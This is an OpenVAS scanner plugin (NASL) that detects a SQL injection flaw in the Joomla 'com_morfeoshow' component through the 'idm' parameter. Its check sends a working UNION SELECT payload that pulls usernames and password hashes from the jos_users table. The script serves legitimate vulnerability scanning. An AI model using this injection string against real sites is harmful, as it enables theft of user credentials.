##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_morfeoshow_sql_inj_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Joomla Component 'com_morfeoshow' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will let attackers to to cause SQL
Injection attack and gain sensitive information.

Impact Level: Application.";

tag_affected = "Joomla Morfeoshow component";

tag_insight = "The flaw is caused by improper validation of user-supplied input
via the 'idm' parameter in 'index.php', which allows attacker to manipulate
SQL queries by injecting arbitrary SQL code.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla and is prone to SQL injection
vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902389");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-07-05 13:15:06 +0200 (Tue, 05 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Joomla Component 'com_morfeoshow' SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://securityreason.com/wlb_show/WLB-2011060085");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102596/joomlamorfeoshow-sql.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

sndReq = http_get(item:string(joomlaDir, "/index.php?option=com_morfeoshow&" +
         "task=view&gallery=1&Itemid=114&Itemid=114&idm=1015+and+1=0+union+" +
         "select+1,2,concat(0x4f70656e564153,0x3a,password,name,0x3a,0x4f70" +
         "656e564153),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21+from+" +
         "jos_users+--+"), port:joomlaPort);
rcvRes = http_send_recv(port:joomlaPort, data:sndReq);
if(egrep(string:rcvRes, pattern:">OpenVAS:(.+):OpenVAS<"))
{
    security_message(joomlaPort);
    exit(0);
}
